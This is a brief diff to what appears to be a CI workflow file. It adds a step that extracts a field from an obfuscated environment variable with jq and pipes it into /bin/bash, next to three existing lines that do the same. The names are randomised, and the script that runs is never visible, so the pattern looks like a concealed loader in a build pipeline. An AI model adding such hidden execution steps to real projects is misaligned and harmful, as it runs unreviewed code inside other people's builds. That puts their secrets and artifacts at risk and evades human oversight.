@@ -40,6 +40,7 @@ jobs:
           echo $ednrb1254 | jq -r .josnk267 | /bin/bash
           echo $nh3939 | jq -r .ic4 | /bin/bash
           echo $uwvpb292 | jq -r .pbi8 | /bin/bash
+          printf '%s' "$kho833" | jq -r .qya730 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
